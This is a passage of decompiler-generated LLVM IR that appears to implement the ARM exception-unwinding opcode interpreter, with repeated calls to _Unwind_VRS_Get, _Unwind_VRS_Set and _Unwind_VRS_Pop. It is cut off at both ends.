  %storemerge160.p = select i1 %v2_1a104, i32 %v2_1a118, i32 %tmp181
  %storemerge160 = add i32 %storemerge160.p, %v4_1a10c
  store i32 %storemerge160, i32* %ip.global-to-local, align 4
  %storemerge135 = load i32, i32* @r7, align 4
  store i32 %storemerge135, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %storemerge160, i32* %stack_var_-36, align 4
  %v5_1a134 = call i32 @_Unwind_VRS_Set(i32 %storemerge135, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_1a134, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19fac.backedge

dec_label_pc_19fac.backedge:                      ; preds = %dec_label_pc_1a0e0, %dec_label_pc_1a15c, %dec_label_pc_1a5e0, %dec_label_pc_1a2ac, %dec_label_pc_1a2e4, %dec_label_pc_1a264, %dec_label_pc_1a4d0
  %v0_19fac.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_19fac

dec_label_pc_1a13c:                               ; preds = %dec_label_pc_1a00c
  %v7_1a13c = icmp eq i32 %v1_1a00c, 144
  store i1 %v7_1a13c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a13c, label %dec_label_pc_1a144, label %dec_label_pc_1a284

dec_label_pc_1a144:                               ; preds = %dec_label_pc_1a13c
  %v1_1a144 = urem i32 %v0_1a004, 16
  store i32 %v1_1a144, i32* %r2.global-to-local, align 4
  %v2_1a148 = icmp eq i32 %v1_1a144, 15
  store i1 %v2_1a148, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a148, label %.thread21, label %bb153

bb153:                                            ; preds = %dec_label_pc_1a144
  %v8_1a14c = icmp eq i32 %v1_1a144, 13
  store i1 %v8_1a14c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_1a14c, label %bb154, label %dec_label_pc_1a15c

.thread21:                                        ; preds = %dec_label_pc_1a144
  store i32 1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1a27c

bb154:                                            ; preds = %bb153
  store i32 1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1a27c

dec_label_pc_1a15c:                               ; preds = %bb153
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1a168 = load i32, i32* @r7, align 4
  store i32 %v0_1a168, i32* %r0.global-to-local, align 4
  %v5_1a170 = call i32 @_Unwind_VRS_Get(i32 %v0_1a168, i32 0, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_1a178 = load i32, i32* @r7, align 4
  store i32 %v0_1a178, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_1a188 = call i32 @_Unwind_VRS_Set(i32 %v0_1a178, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_1a188, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19fac.backedge

dec_label_pc_1a190:                               ; preds = %dec_label_pc_1a0c8
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1a1a0 = load i32, i32* @r7, align 4
  store i32 %v0_1a1a0, i32* %r0.global-to-local, align 4
  %v7_1a1a8 = call i32 @_Unwind_VRS_Get(i32 %v0_1a1a0, i32 0, i32 14, i32 0, i8* %tmp146)
  %v0_1a1ac = load i32, i32* @r7, align 4
  store i32 %v0_1a1ac, i32* %r0.global-to-local, align 4
  %v0_1a1b0 = load i32, i32* @sl, align 4
  store i32 %v0_1a1b0, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 %v0_1a1b0, i32* %r3.global-to-local, align 4
  %v5_1a1c0 = call i32 @_Unwind_VRS_Set(i32 %v0_1a1ac, i32 %v0_1a1b0, i32 15, i32 %v0_1a1b0, i8* bitcast (i32* @0 to i8*))
  %v0_1a1c4 = load i32, i32* @sl, align 4
  store i32 %v0_1a1c4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a0d4

dec_label_pc_1a1cc:                               ; preds = %dec_label_pc_1a3c0
  %v7_1a1cc = icmp eq i32 %v0_1a3c0, 199
  store i1 %v7_1a1cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a1cc, label %dec_label_pc_1a4a0, label %dec_label_pc_1a1d4

dec_label_pc_1a1d4:                               ; preds = %dec_label_pc_1a1cc
  %v1_1a1d4 = and i32 %v0_1a004, 248
  store i32 %v1_1a1d4, i32* %r3.global-to-local, align 4
  %v7_1a1d8 = icmp eq i32 %v1_1a1d4, 192
  store i1 %v7_1a1d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a1d8, label %.thread24, label %dec_label_pc_1a1f0

.thread24:                                        ; preds = %dec_label_pc_1a1d4
  %v2_1a1dc = urem i32 %v0_1a004, 16
  %v2_1a1e0 = add nuw nsw i32 %v2_1a1dc, 1
  store i32 3, i32* %r1.global-to-local, align 4
  %v2_1a1e8 = or i32 %v2_1a1e0, 655360
  store i32 %v2_1a1e8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1a2ac

dec_label_pc_1a1f0:                               ; preds = %dec_label_pc_1a1d4
  %v7_1a1f0 = icmp eq i32 %v0_1a3c0, 200
  store i1 %v7_1a1f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a1f0, label %dec_label_pc_1a434, label %dec_label_pc_1a1f8

dec_label_pc_1a1f8:                               ; preds = %dec_label_pc_1a1f0
  %v7_1a1f8 = icmp eq i32 %v0_1a3c0, 201
  store i1 %v7_1a1f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a1f8, label %dec_label_pc_1a200, label %dec_label_pc_1a27c

dec_label_pc_1a200:                               ; preds = %dec_label_pc_1a1f8
  %v0_1a200 = load i32, i32* @r5, align 4
  %v1_1a200 = add i32 %v0_1a200, 8
  %v2_1a200 = inttoptr i32 %v1_1a200 to i8*
  %v3_1a200 = load i8, i8* %v2_1a200, align 1
  %v4_1a200 = zext i8 %v3_1a200 to i32
  store i32 %v4_1a200, i32* %r3.global-to-local, align 4
  %v2_1a204 = icmp eq i8 %v3_1a200, 0
  store i1 %v2_1a204, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a204, label %dec_label_pc_1a214, label %.thread26

.thread26:                                        ; preds = %dec_label_pc_1a200
  %v2_1a208 = add nsw i32 %v4_1a200, -1
  store i32 %v2_1a208, i32* %r3.global-to-local, align 4
  %v2_1a20c = trunc i32 %v2_1a208 to i8
  store i8 %v2_1a20c, i8* %v2_1a200, align 1
  %v0_1a210.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a210.pr.pr, label %.thread26.dec_label_pc_1a214_crit_edge, label %dec_label_pc_1a248

.thread26.dec_label_pc_1a214_crit_edge:           ; preds = %.thread26
  %v0_1a214.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1a214

dec_label_pc_1a214:                               ; preds = %.thread26.dec_label_pc_1a214_crit_edge, %dec_label_pc_1a200
  %v2_1a22c = phi i32 [ %v0_1a214.pre, %.thread26.dec_label_pc_1a214_crit_edge ], [ %v0_1a200, %dec_label_pc_1a200 ]
  %v1_1a214 = add i32 %v2_1a22c, 9
  %v2_1a214 = inttoptr i32 %v1_1a214 to i8*
  %v3_1a214 = load i8, i8* %v2_1a214, align 1
  %v4_1a214 = zext i8 %v3_1a214 to i32
  store i32 %v4_1a214, i32* %r3.global-to-local, align 4
  %v2_1a218 = icmp eq i8 %v3_1a214, 0
  store i1 %v2_1a218, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a218, label %dec_label_pc_1a264, label %dec_label_pc_1a228

dec_label_pc_1a228:                               ; preds = %dec_label_pc_1a214
  %v1_1a228 = add nsw i32 %v4_1a214, -1
  store i32 %v1_1a228, i32* %r3.global-to-local, align 4
  %v1_1a22c = trunc i32 %v1_1a228 to i8
  store i8 %v1_1a22c, i8* %v2_1a214, align 1
  %v0_1a230 = load i32, i32* @r5, align 4
  %v1_1a230 = add i32 %v0_1a230, 4
  %v2_1a230 = inttoptr i32 %v1_1a230 to i32*
  %v3_1a230 = load i32, i32* %v2_1a230, align 4
  store i32 %v3_1a230, i32* %r2.global-to-local, align 4
  %v1_1a234 = inttoptr i32 %v3_1a230 to i32*
  %v2_1a234 = load i32, i32* %v1_1a234, align 4
  store i32 %v2_1a234, i32* %r0.global-to-local, align 4
  %v4_1a234 = add i32 %v3_1a230, 4
  store i32 %v4_1a234, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_1a234, i32* %v2_1a230, align 4
  %v0_1a240 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a240 = trunc i32 %v0_1a240 to i8
  %v2_1a240 = load i32, i32* @r5, align 4
  %v3_1a240 = add i32 %v2_1a240, 8
  %v4_1a240 = inttoptr i32 %v3_1a240 to i8*
  store i8 %v1_1a240, i8* %v4_1a240, align 1
  %v0_1a244 = load i32, i32* %r0.global-to-local, align 4
  %v1_1a244 = load i32, i32* @r5, align 4
  %v2_1a244 = inttoptr i32 %v1_1a244 to i32*
  store i32 %v0_1a244, i32* %v2_1a244, align 4
  br label %dec_label_pc_1a248

dec_label_pc_1a248:                               ; preds = %.thread26, %dec_label_pc_1a228
  %v0_1a248 = load i32, i32* %r0.global-to-local, align 4
  %v3_1a248 = udiv i32 %v0_1a248, 16777216
  %v1_1a24c = urem i32 %v3_1a248, 16
  %v3_1a250 = mul i32 %v0_1a248, 256
  %v1_1a254 = add nuw nsw i32 %v1_1a24c, 1
  store i32 %v1_1a254, i32* %r1.global-to-local, align 4
  %v1_1a258 = and i32 %v3_1a248, 240
  store i32 %v1_1a258, i32* %r3.global-to-local, align 4
  %v1_1a25c = load i32, i32* @r5, align 4
  %v2_1a25c = inttoptr i32 %v1_1a25c to i32*
  store i32 %v3_1a250, i32* %v2_1a25c, align 4
  %v0_1a260 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a260 = load i32, i32* %r3.global-to-local, align 4
  %v4_1a260 = mul i32 %v1_1a260, 4096
  %v5_1a260 = or i32 %v4_1a260, %v0_1a260
  br label %dec_label_pc_1a264

dec_label_pc_1a264:                               ; preds = %dec_label_pc_1a214, %dec_label_pc_1a248
  %storemerge = phi i32 [ %v5_1a260, %dec_label_pc_1a248 ], [ 720897, %dec_label_pc_1a214 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v0_1a264 = load i32, i32* @r7, align 4
  store i32 %v0_1a264, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v4_1a270 = call i32 @_Unwind_VRS_Pop(i32 %v0_1a264, i32 1, i32 5, i32 5)
  store i32 %v4_1a270, i32* %r0.global-to-local, align 4
  %v2_1a274 = icmp eq i32 %v4_1a270, 0
  store i1 %v2_1a274, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a274, label %dec_label_pc_19fac.backedge, label %dec_label_pc_1a27c

dec_label_pc_1a27c:                               ; preds = %dec_label_pc_1a4c8, %dec_label_pc_1a1f8, %dec_label_pc_1a2d8, %dec_label_pc_1a67c, %dec_label_pc_1a64c, %dec_label_pc_1a628, %dec_label_pc_1a4b4, %dec_label_pc_1a264, %dec_label_pc_1a078, %dec_label_pc_1a06c, %bb154, %.thread21
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a0d4

dec_label_pc_1a284:                               ; preds = %dec_label_pc_1a13c
  %v7_1a284 = icmp eq i32 %v1_1a00c, 160
  store i1 %v7_1a284, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a284, label %dec_label_pc_1a28c, label %dec_label_pc_1a2c8

dec_label_pc_1a28c:                               ; preds = %dec_label_pc_1a284
  %v0_1a28c = load i32, i32* %ip.global-to-local, align 4
  %v1_1a28c = urem i32 %v0_1a28c, 8
  %v1_1a290 = xor i32 %v1_1a28c, 7
  store i32 %v1_1a290, i32* %r3.global-to-local, align 4
  %v6_1a298 = lshr i32 4080, %v1_1a290
  %v1_1a29c = and i32 %v0_1a004, 8
  %v2_1a29c = icmp eq i32 %v1_1a29c, 0
  store i1 %v2_1a29c, i1* %cpsr_z.global-to-local, align 1
  %v1_1a2a0 = and i32 %v6_1a298, 4080
  %tmp155 = mul nuw nsw i32 %v1_1a29c, 2048
  %tmp156 = or i32 %v1_1a2a0, %tmp155
  store i32 %tmp156, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1a2ac

dec_label_pc_1a2ac:                               ; preds = %.thread44, %.thread24, %dec_label_pc_1a63c.dec_label_pc_1a2ac_crit_edge, %bb157, %dec_label_pc_1a498, %dec_label_pc_1a42c, %dec_label_pc_1a38c, %dec_label_pc_1a28c
  %v2_1a2b4 = phi i32 [ %v2_1a3b0, %.thread44 ], [ %v2_1a3b8, %bb157 ], [ %v2_1a2b4.pre, %dec_label_pc_1a63c.dec_label_pc_1a2ac_crit_edge ], [ %v2_1a1e8, %.thread24 ], [ %storemerge130, %dec_label_pc_1a498 ], [ %storemerge131, %dec_label_pc_1a42c ], [ %storemerge132, %dec_label_pc_1a38c ], [ %tmp156, %dec_label_pc_1a28c ]
  %v0_1a2b0 = phi i32 [ 2, %.thread44 ], [ 1, %bb157 ], [ 0, %dec_label_pc_1a63c.dec_label_pc_1a2ac_crit_edge ], [ 3, %.thread24 ], [ 2, %dec_label_pc_1a498 ], [ 3, %dec_label_pc_1a42c ], [ 1, %dec_label_pc_1a38c ], [ 0, %dec_label_pc_1a28c ]
  %v0_1a2ac = load i32, i32* @r7, align 4
  store i32 %v0_1a2ac, i32* %r0.global-to-local, align 4
  store i32 %v0_1a2b0, i32* %r3.global-to-local, align 4
  %v4_1a2b4 = call i32 @_Unwind_VRS_Pop(i32 %v0_1a2ac, i32 %v0_1a2b0, i32 %v2_1a2b4, i32 %v0_1a2b0)
  store i32 %v4_1a2b4, i32* %r0.global-to-local, align 4
  %v2_1a2b8 = icmp eq i32 %v4_1a2b4, 0
  store i1 %v2_1a2b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a2b8, label %dec_label_pc_19fac.backedge, label %dec_label_pc_1a2c0

dec_label_pc_1a2c0:                               ; preds = %dec_label_pc_1a2ac
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a0d4

dec_label_pc_1a2c8:                               ; preds = %dec_label_pc_1a284
  %v7_1a2c8 = icmp eq i32 %v1_1a00c, 176
  store i1 %v7_1a2c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a2c8, label %dec_label_pc_1a310, label %dec_label_pc_1a2d0

dec_label_pc_1a2d0:                               ; preds = %dec_label_pc_1a2c8
  %v7_1a2d0 = icmp eq i32 %v1_1a00c, 192
  store i1 %v7_1a2d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a2d0, label %dec_label_pc_1a3c0, label %dec_label_pc_1a2d8

dec_label_pc_1a2d8:                               ; preds = %dec_label_pc_1a2d0
  %v1_1a2d8 = and i32 %v0_1a004, 248
  store i32 %v1_1a2d8, i32* %r3.global-to-local, align 4
  %v7_1a2dc = icmp eq i32 %v1_1a2d8, 208
  store i1 %v7_1a2dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a2dc, label %dec_label_pc_1a2e4, label %dec_label_pc_1a27c

dec_label_pc_1a2e4:                               ; preds = %dec_label_pc_1a2d8
  %v1_1a2e4 = urem i32 %v0_1a004, 8
  %v1_1a2e8 = add nuw nsw i32 %v1_1a2e4, 1
  %v1_1a2ec = or i32 %v1_1a2e8, 524288
  store i32 %v1_1a2ec, i32* %r2.global-to-local, align 4
  %v0_1a2f0 = load i32, i32* @r7, align 4
  store i32 %v0_1a2f0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v4_1a2fc = call i32 @_Unwind_VRS_Pop(i32 %v0_1a2f0, i32 1, i32 %v1_1a2ec, i32 5)
  store i32 %v4_1a2fc, i32* %r0.global-to-local, align 4
  %v2_1a300 = icmp eq i32 %v4_1a2fc, 0
  store i1 %v2_1a300, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a300, label %dec_label_pc_19fac.backedge, label %dec_label_pc_1a308

dec_label_pc_1a308:                               ; preds = %dec_label_pc_1a2e4
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a0d4

dec_label_pc_1a310:                               ; preds = %dec_label_pc_1a2c8
  %v0_1a310 = load i32, i32* %ip.global-to-local, align 4
  %v7_1a310 = icmp eq i32 %v0_1a310, 177
  store i1 %v7_1a310, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a310, label %dec_label_pc_1a614, label %dec_label_pc_1a318

dec_label_pc_1a318:                               ; preds = %dec_label_pc_1a310
  %v7_1a318 = icmp eq i32 %v0_1a310, 178
  store i1 %v7_1a318, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a318, label %dec_label_pc_1a4ec, label %dec_label_pc_1a320

dec_label_pc_1a320:                               ; preds = %dec_label_pc_1a318
  %v7_1a320 = icmp eq i32 %v0_1a310, 179
  store i1 %v7_1a320, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a320, label %dec_label_pc_1a328, label %dec_label_pc_1a394

dec_label_pc_1a328:                               ; preds = %dec_label_pc_1a320
  %v0_1a328 = load i32, i32* @r5, align 4
  %v1_1a328 = add i32 %v0_1a328, 8
  %v2_1a328 = inttoptr i32 %v1_1a328 to i8*
  %v3_1a328 = load i8, i8* %v2_1a328, align 1
  %v4_1a328 = zext i8 %v3_1a328 to i32
  store i32 %v4_1a328, i32* %r3.global-to-local, align 4
  %v2_1a32c = icmp eq i8 %v3_1a328, 0
  store i1 %v2_1a32c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a32c, label %dec_label_pc_1a33c, label %.thread30

.thread30:                                        ; preds = %dec_label_pc_1a328
  %v2_1a330 = add nsw i32 %v4_1a328, -1
  store i32 %v2_1a330, i32* %r3.global-to-local, align 4
  %v2_1a334 = trunc i32 %v2_1a330 to i8
  store i8 %v2_1a334, i8* %v2_1a328, align 1
  %v0_1a338.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a338.pr.pr, label %.thread30.dec_label_pc_1a33c_crit_edge, label %dec_label_pc_1a370

.thread30.dec_label_pc_1a33c_crit_edge:           ; preds = %.thread30
  %v0_1a33c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1a33c

dec_label_pc_1a33c:                               ; preds = %.thread30.dec_label_pc_1a33c_crit_edge, %dec_label_pc_1a328
  %v2_1a354 = phi i32 [ %v0_1a33c.pre, %.thread30.dec_label_pc_1a33c_crit_edge ], [ %v0_1a328, %dec_label_pc_1a328 ]
  %v1_1a33c = add i32 %v2_1a354, 9
  %v2_1a33c = inttoptr i32 %v1_1a33c to i8*
  %v3_1a33c = load i8, i8* %v2_1a33c, align 1
  %v4_1a33c = zext i8 %v3_1a33c to i32
  store i32 %v4_1a33c, i32* %r3.global-to-local, align 4
  %v2_1a340 = icmp eq i8 %v3_1a33c, 0
  store i1 %v2_1a340, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a340, label %dec_label_pc_1a38c, label %dec_label_pc_1a350

dec_label_pc_1a350:                               ; preds = %dec_label_pc_1a33c
  %v1_1a350 = add nsw i32 %v4_1a33c, -1
  store i32 %v1_1a350, i32* %r3.global-to-local, align 4
  %v1_1a354 = trunc i32 %v1_1a350 to i8
  store i8 %v1_1a354, i8* %v2_1a33c, align 1
  %v0_1a358 = load i32, i32* @r5, align 4
  %v1_1a358 = add i32 %v0_1a358, 4
  %v2_1a358 = inttoptr i32 %v1_1a358 to i32*
  %v3_1a358 = load i32, i32* %v2_1a358, align 4
  store i32 %v3_1a358, i32* %r2.global-to-local, align 4
  %v1_1a35c = inttoptr i32 %v3_1a358 to i32*
  %v2_1a35c = load i32, i32* %v1_1a35c, align 4
  store i32 %v2_1a35c, i32* %r0.global-to-local, align 4
  %v4_1a35c = add i32 %v3_1a358, 4
  store i32 %v4_1a35c, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_1a35c, i32* %v2_1a358, align 4
  %v0_1a368 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a368 = trunc i32 %v0_1a368 to i8
  %v2_1a368 = load i32, i32* @r5, align 4
  %v3_1a368 = add i32 %v2_1a368, 8
  %v4_1a368 = inttoptr i32 %v3_1a368 to i8*
  store i8 %v1_1a368, i8* %v4_1a368, align 1
  %v0_1a36c = load i32, i32* %r0.global-to-local, align 4
  %v1_1a36c = load i32, i32* @r5, align 4
  %v2_1a36c = inttoptr i32 %v1_1a36c to i32*
  store i32 %v0_1a36c, i32* %v2_1a36c, align 4
  br label %dec_label_pc_1a370

dec_label_pc_1a370:                               ; preds = %.thread30, %dec_label_pc_1a350
  %v0_1a370 = load i32, i32* %r0.global-to-local, align 4
  %v3_1a370 = udiv i32 %v0_1a370, 16777216
  %v1_1a374 = urem i32 %v3_1a370, 16
  %v3_1a378 = mul i32 %v0_1a370, 256
  store i32 %v3_1a378, i32* %r0.global-to-local, align 4
  %v1_1a37c = add nuw nsw i32 %v1_1a374, 1
  store i32 %v1_1a37c, i32* %r2.global-to-local, align 4
  %v1_1a380 = and i32 %v3_1a370, 240
  store i32 %v1_1a380, i32* %r3.global-to-local, align 4
  %v1_1a384 = load i32, i32* @r5, align 4
  %v2_1a384 = inttoptr i32 %v1_1a384 to i32*
  store i32 %v3_1a378, i32* %v2_1a384, align 4
  %v0_1a388 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a388 = load i32, i32* %r3.global-to-local, align 4
  %v4_1a388 = mul i32 %v1_1a388, 4096
  %v5_1a388 = or i32 %v4_1a388, %v0_1a388
  br label %dec_label_pc_1a38c

dec_label_pc_1a38c:                               ; preds = %dec_label_pc_1a33c, %dec_label_pc_1a370
  %storemerge132 = phi i32 [ %v5_1a388, %dec_label_pc_1a370 ], [ 720897, %dec_label_pc_1a33c ]
  store i32 %storemerge132, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1a2ac

dec_label_pc_1a394:                               ; preds = %dec_label_pc_1a320
  %v1_1a394 = and i32 %v0_1a004, 252
  store i32 %v1_1a394, i32* %r3.global-to-local, align 4
  %v7_1a398 = icmp eq i32 %v1_1a394, 180
  store i1 %v7_1a398, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a398, label %.thread44, label %bb157

.thread44:                                        ; preds = %dec_label_pc_1a394
  %v2_1a39c = urem i32 %v0_1a004, 4
  %v2_1a3a4 = add nuw nsw i32 %v2_1a39c, 1
  store i32 2, i32* %r1.global-to-local, align 4
  %v2_1a3b0 = or i32 %v2_1a3a4, 262144
  store i32 %v2_1a3b0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1a2ac

bb157:                                            ; preds = %dec_label_pc_1a394
  %v2_1a3a0 = urem i32 %v0_1a310, 8
  %v2_1a3a8 = add nuw nsw i32 %v2_1a3a0, 1
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_1a3b8 = or i32 %v2_1a3a8, 524288
  store i32 %v2_1a3b8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1a2ac

dec_label_pc_1a3c0:                               ; preds = %dec_label_pc_1a2d0
  %v0_1a3c0 = load i32, i32* %ip.global-to-local, align 4
  %v7_1a3c0 = icmp eq i32 %v0_1a3c0, 198
  store i1 %v7_1a3c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a3c0, label %dec_label_pc_1a3c8, label %dec_label_pc_1a1cc

dec_label_pc_1a3c8:                               ; preds = %dec_label_pc_1a3c0
  %v0_1a3c8 = load i32, i32* @r5, align 4
  %v1_1a3c8 = add i32 %v0_1a3c8, 8
  %v2_1a3c8 = inttoptr i32 %v1_1a3c8 to i8*
  %v3_1a3c8 = load i8, i8* %v2_1a3c8, align 1
  %v4_1a3c8 = zext i8 %v3_1a3c8 to i32
  store i32 %v4_1a3c8, i32* %r3.global-to-local, align 4
  %v2_1a3cc = icmp eq i8 %v3_1a3c8, 0
  store i1 %v2_1a3cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a3cc, label %dec_label_pc_1a3dc, label %.thread48

.thread48:                                        ; preds = %dec_label_pc_1a3c8
  %v2_1a3d0 = add nsw i32 %v4_1a3c8, -1
  store i32 %v2_1a3d0, i32* %r3.global-to-local, align 4
  %v2_1a3d4 = trunc i32 %v2_1a3d0 to i8
  store i8 %v2_1a3d4, i8* %v2_1a3c8, align 1
  %v0_1a3d8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a3d8.pr.pr, label %.thread48.dec_label_pc_1a3dc_crit_edge, label %dec_label_pc_1a410

.thread48.dec_label_pc_1a3dc_crit_edge:           ; preds = %.thread48
  %v0_1a3dc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1a3dc

dec_label_pc_1a3dc:                               ; preds = %.thread48.dec_label_pc_1a3dc_crit_edge, %dec_label_pc_1a3c8
  %v2_1a3f4 = phi i32 [ %v0_1a3dc.pre, %.thread48.dec_label_pc_1a3dc_crit_edge ], [ %v0_1a3c8, %dec_label_pc_1a3c8 ]
  %v1_1a3dc = add i32 %v2_1a3f4, 9
  %v2_1a3dc = inttoptr i32 %v1_1a3dc to i8*
  %v3_1a3dc = load i8, i8* %v2_1a3dc, align 1
  %v4_1a3dc = zext i8 %v3_1a3dc to i32
  store i32 %v4_1a3dc, i32* %r3.global-to-local, align 4
  %v2_1a3e0 = icmp eq i8 %v3_1a3dc, 0
  store i1 %v2_1a3e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a3e0, label %dec_label_pc_1a42c, label %dec_label_pc_1a3f0

dec_label_pc_1a3f0:                               ; preds = %dec_label_pc_1a3dc
  %v1_1a3f0 = add nsw i32 %v4_1a3dc, -1
  store i32 %v1_1a3f0, i32* %r3.global-to-local, align 4
  %v1_1a3f4 = trunc i32 %v1_1a3f0 to i8
  store i8 %v1_1a3f4, i8* %v2_1a3dc, align 1
  %v0_1a3f8 = load i32, i32* @r5, align 4
  %v1_1a3f8 = add i32 %v0_1a3f8, 4
  %v2_1a3f8 = inttoptr i32 %v1_1a3f8 to i32*
  %v3_1a3f8 = load i32, i32* %v2_1a3f8, align 4
  store i32 %v3_1a3f8, i32* %r2.global-to-local, align 4
  %v1_1a3fc = inttoptr i32 %v3_1a3f8 to i32*
  %v2_1a3fc = load i32, i32* %v1_1a3fc, align 4
  store i32 %v2_1a3fc, i32* %r0.global-to-local, align 4
  %v4_1a3fc = add i32 %v3_1a3f8, 4
  store i32 %v4_1a3fc, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_1a3fc, i32* %v2_1a3f8, align 4
  %v0_1a408 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a408 = trunc i32 %v0_1a408 to i8
  %v2_1a408 = load i32, i32* @r5, align 4
  %v3_1a408 = add i32 %v2_1a408, 8
  %v4_1a408 = inttoptr i32 %v3_1a408 to i8*
  store i8 %v1_1a408, i8* %v4_1a408, align 1
  %v0_1a40c = load i32, i32* %r0.global-to-local, align 4
  %v1_1a40c = load i32, i32* @r5, align 4
  %v2_1a40c = inttoptr i32 %v1_1a40c to i32*
  store i32 %v0_1a40c, i32* %v2_1a40c, align 4
  br label %dec_label_pc_1a410

dec_label_pc_1a410:                               ; preds = %.thread48, %dec_label_pc_1a3f0
  %v0_1a410 = load i32, i32* %r0.global-to-local, align 4
  %v3_1a410 = udiv i32 %v0_1a410, 16777216
  %v1_1a414 = urem i32 %v3_1a410, 16
  %v3_1a418 = mul i32 %v0_1a410, 256
  store i32 %v3_1a418, i32* %r0.global-to-local, align 4
  %v1_1a41c = add nuw nsw i32 %v1_1a414, 1
  store i32 %v1_1a41c, i32* %r2.global-to-local, align 4
  %v1_1a420 = and i32 %v3_1a410, 240
  store i32 %v1_1a420, i32* %r3.global-to-local, align 4
  %v1_1a424 = load i32, i32* @r5, align 4
  %v2_1a424 = inttoptr i32 %v1_1a424 to i32*
  store i32 %v3_1a418, i32* %v2_1a424, align 4
  %v0_1a428 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a428 = load i32, i32* %r3.global-to-local, align 4
  %v4_1a428 = mul i32 %v1_1a428, 4096
  %v5_1a428 = or i32 %v4_1a428, %v0_1a428
  br label %dec_label_pc_1a42c

dec_label_pc_1a42c:                               ; preds = %dec_label_pc_1a3dc, %dec_label_pc_1a410
  %storemerge131 = phi i32 [ %v5_1a428, %dec_label_pc_1a410 ], [ 720897, %dec_label_pc_1a3dc ]
  store i32 %storemerge131, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1a2ac

dec_label_pc_1a434:                               ; preds = %dec_label_pc_1a1f0
  %v0_1a434 = load i32, i32* @r5, align 4
  %v1_1a434 = add i32 %v0_1a434, 8
  %v2_1a434 = inttoptr i32 %v1_1a434 to i8*
  %v3_1a434 = load i8, i8* %v2_1a434, align 1
  %v4_1a434 = zext i8 %v3_1a434 to i32
  store i32 %v4_1a434, i32* %r3.global-to-local, align 4
  %v2_1a438 = icmp eq i8 %v3_1a434, 0
